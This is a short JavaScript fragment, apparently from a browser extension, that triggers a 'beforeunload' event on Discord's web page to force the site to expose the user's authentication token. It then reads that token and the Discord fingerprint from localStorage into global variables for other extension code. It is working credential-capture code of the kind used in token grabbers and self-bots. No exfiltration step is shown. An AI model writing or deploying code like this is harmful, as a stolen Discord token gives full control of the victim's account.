window.dispatchEvent(new Event('beforeunload')); // required, or token will be undefined!
// assigning localStorage to a variable allows us to use it in the future, and makes it impossible to remove!
// all of these variables are global to our extension, they can be accessed from index.js
const ls = window.localStorage;
/*** @type {string} 
 * * @description Discord token */
const token = JSON.parse(ls.token);
/*** @type {string} 
 * * @description Discord fingerprint */
const fingerprint = JSON.parse(ls.fingerprint);